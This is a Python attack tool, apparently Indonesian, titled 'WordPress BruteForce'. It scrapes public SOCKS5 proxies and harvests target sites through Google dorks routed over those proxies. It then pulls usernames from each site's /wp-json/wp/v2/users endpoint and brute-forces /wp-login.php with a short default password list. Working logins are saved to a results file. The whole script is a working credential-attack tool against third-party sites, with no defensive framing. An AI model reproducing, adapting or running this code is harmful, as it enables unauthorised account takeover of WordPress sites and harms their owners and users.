from concurrent.futures import ThreadPoolExecutor as work
import requests as r, sys, os, json, re
from bs4 import BeautifulSoup as par
from random import choice
from urllib.parse import quote
from os.path import exists as adagak

readFile = lambda file: open(file, "r").read().strip().split("\n")
clear = lambda: os.system("clear") if "cmd" in sys.platform.lower() else os.system("clear")
cap, success, failed = 0, 0, 0
header = {"user-agent": "chrome"}
save = "wpbrute.txt"

def writer(name, content):
	try:
		if content in open(name, "r").read():
			pass
		else:
			open(name, "a+").write(content+"\n")
	except:
		open(name, "a+").write(content+"\n")

def ceks():
	fileip = input("(?) File target: ")
	while True:
		try:
			check = open(fileip, "r").read().strip().split("\n")
		except FileNotFoundError:
			print("(!) File not found")
			fileip = input("(?) File target: ")
			continue
		break
	return check

def saved():
	files = input("(?) Save result: ")
	while adagak(files):
		print("(!) File tersebut sudah ada")
		yt = input("? Ingin menimpa hasil? [Y/T]: ")
		if yt in list("Yy"):
			return files
		elif yt in list("Tt"):
			files = input("= Save result: ")
			continue
		else:
			files = input("= Save result: ")
			continue
	return files

def get_version_proxy():
	rest = []
	ser = r.Session()
	ser.headers.update({"user-agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012;) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36"})

	gots = par(ser.get("https://hidemy.name/en/proxy-list/?type=5").text, "html.parser")
	reg = re.findall(">(\d+.\d+.\d+.\d+).*?>(\d+).*?i", str(gots))
	for x in reg:
		rest.append("socks5://"+x[0]+":"+x[1])

	if rest != 0:
		try:os.remove(".proxies")
		except:pass
		for yay in rest:
			open(".proxies", "a+").write(yay+"\n")
		exit("(✓) File save in .proxies, restart this tools\n")
	else:
		exit("(✓) File save in .proxies, restart this tools\n")

def koDork(dork, rse):
	#-> Alternate
	ses = r.Session()
	ses.headers.update({"user-agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0"})
	buka = choice(readFile(".proxies"))
	hasil = 0
	#--------------#

	gets = par(ses.get("https://www.google.com/search?q=" + dork, proxies={"http": buka}).text, "html.parser")
	while True:
		buka = choice(readFile(".proxies"))
		if "overflow:hidden;margin-top:0;padding-top:.33em;text-overflow:ellipsis" in str(gets):
			print("\r(?) Hasil pencarian tidak ada?! ")
			break
		elif "captcha" in str(gets):
			print("\r(!) Upss.. tercegah oleh captcha, silahkan hidup dan matikan mode pesawat ")
			break
		else:
			reg = re.findall("header-feature.*?href=\"(.*?)\".*?data-jsarwt", str(gets))
			hasil += len(reg)

			#-> save
			for sev in reg:
				print("\r(✓) Berhasil mendapatkan "+str(hasil)+" target url ", end="")
				open(rse.replace(".txt","")+".txt", "a+").write(sev+"\n")

			if 'pnnext' in str(gets):
				nice = gets.find("a", {"id": "pnnext"})["href"]
				gets = par(ses.get("https://www.google.com" + nice, proxies={"http": buka}).text, "html.parser")
				continue
			else:
				print("\r(✓) Tersimpan dalam file: "+rse+" ", end="\n")
				break

def run_dorking(dork, save):
	try:
		cek = readFile(".proxies")
	except FileNotFoundError:
		exit("(!) Anda harus melakukan update pada proxies ")

	realDork = quote(dork)
	with work(max_workers=10) as sub:
		sub.submit(koDork, realDork, save)

class ngedork:
	def single():
		dork = input("\n(?) Dork: ")
		while dork == "":
			dork = input("(?) Dork: ")
		sve = saved()
		run_dorking(dork, sve)
	def multi():
		target = ceks()
		save = saved()
		for x in target:
			run_dorking(x, save)

def brute(urls, user, pasw):
	global success, failed, cap, save
	for paslist in pasw:
		useProx = choice(readFile(".proxies"))
		ses = r.Session()
		ses.headers.update({"User-Agent": "Mozilla/5.0 (Linux; Android 11; vivo 1904 Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"})

		try:
			cek = ses.get(urls + "/wp-login.php", proxies={"http": useProx}, allow_redirects=True)
			if "captcha" in str(cek.text):
				cap += 1
				break
			else:
				pass
		except:
			break
		if cek.status_code != 200:
			failed += 1
			break
		else:
			pars = par(cek.text, "html.parser")
			if "/wp-admin/" not in str(pars):
				failed += 1
				break
			else:
				getForm = pars.find("form", {"id": "loginform"})
				params = {}
				for inp in getForm.find_all("input"):
					if inp.get("name") in ["log", "pwd"]:
						pass
					else:
						params.update({inp.get("name"): inp.get("value")})
				params.update({"log": user, "pwd": paslist})
				posted = ses.post(getForm.get("action"), data=params, cookies=cek.cookies.get_dict(), proxies={"http": useProx})
				if "menu-dashboard" in str(posted.text):
					urls = cek.url
					print("\x1b[1;92msuccess ->\x1b[1;00m "+urls+"#"+user+"@"+paslist)
					open(save, "a+").write(urls+"#"+user+"@"+paslist+"\n")
					success += 1
					break
				else:
					print("\x1b[1;91mfailed  ->\x1b[1;00m "+urls+"#"+user+"@"+paslist)
					failed += 1
					pass

jungler = []
def check_site(st, svg, lener):
	global jungler
	if st.startswith("https://") or st.startswith("http://"):
		reg = re.findall("(https?://.*?)/", st)[0]
	else:
		nice_st = "http://"+st+"/"
		reg = re.findall("(https?://.*?)/", st)[0]

	try:
		finds = r.get(reg+"/wp-json/wp/v2/users", headers=header, timeout=5)
	except r.exceptions.ConnectionError:
		check_site(st, svg, lener)
	except:
		jungler.append("False")
	if finds.status_code != 200:
		jungler.append("False")
	else:
		try:
			jso = json.loads(finds.text)
			shows = str(reg)
			for zz in jso:
				shows += "@"+zz["slug"]
			jungler.append(shows)
			writer(svg, shows)
		except:
			jungler.append("False")
	print("\r(!) Preparation ["+str(int(len(jungler) / int(lener) * 100))+"%] getting data, please wait.. ", end="")

def start_crack():
	siteList = input("(!) File site list: ")
	try:
		readSite = readFile(siteList)
	except FileNotFoundError:
		exit("[=] File site not found\n")
	print("")

	with work(max_workers=20) as br:
		for site in readSite:
			if "@" in site:
				users = site.split("@")[1:]
			else:
				users = ["admin", "administrator"]
			word = ['admin', 'administrator', 'admin123', 'superadmin', 'superadmin123', 'admin1234', 'administrator1234', "hackerkontol'='123", 'pass', 'password']
			for yy in users:
				word.append(yy)
			for runner in users:
				br.submit(brute, site.split("@")[0], runner, word)
	print("\n(✓) Selesai...\n")

class wpbf:
	def single():
		site = input("(?) Site: ")
		savs = saved()
		print("(!) Tunggu sebentar..")
		check_site(site, savs, 1)
		print("\r(✓) Success preparation data, save: " + savs, end="\n")

	def multi():
		site = ceks()
		savs = saved()
		with work(max_workers=10) as prep:
			for x in site:
				prep.submit(check_site, x, savs, len(site))
		print("\r(✓) Success preparation data, save: " + savs, end="\n")


def start_menu():
	clear()
	print("""
	WordPress BruteForce
      ------------------------
	1. Single Preparation data
	2. Multi Preparation
	3. Single dork
	4. Multi dork
	5. get / update proxies
	6. Start cracking
	0. Exit
      ------------------------
      """)
	pil = input("[?] Choose: ")
	while pil == "" or not pil.isdigit():
		pil = input("[?] Choose: ")
	if pil == "1":
		wpbf.single()
	elif pil == "2":
		wpbf.multi()
	elif pil == "3":
		ngedork.single()
	elif pil == "4":
		ngedork.multi()
	elif pil == "5":
		get_version_proxy()
	elif pil == "6":
		start_crack()
	else:
		exit("[!] Exit program.. byee\n")


if __name__=="__main__":
	start_menu()
